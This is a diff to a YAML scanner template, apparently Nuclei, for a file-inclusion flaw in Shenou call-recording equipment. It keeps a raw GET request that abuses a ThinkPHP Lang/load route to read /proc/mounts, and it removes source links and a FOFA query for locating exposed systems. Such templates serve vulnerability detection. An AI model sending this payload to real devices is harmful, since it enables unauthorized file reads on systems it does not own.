@@ -3,17 +3,11 @@ info:
   name: 申瓯通信设备index存在文件包含漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gbovwl8fxot4b3or'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gbovwl8fxot4b3or
-    fofa: title="在线录音管理系统"
 http:
 - raw:
-  - 'GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744202538508-a1cb5173-0f0c-4e4b-b72c-5aad30b1dc42.png)'
+  - GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1
   redirects: false
   matchers:
   - status:
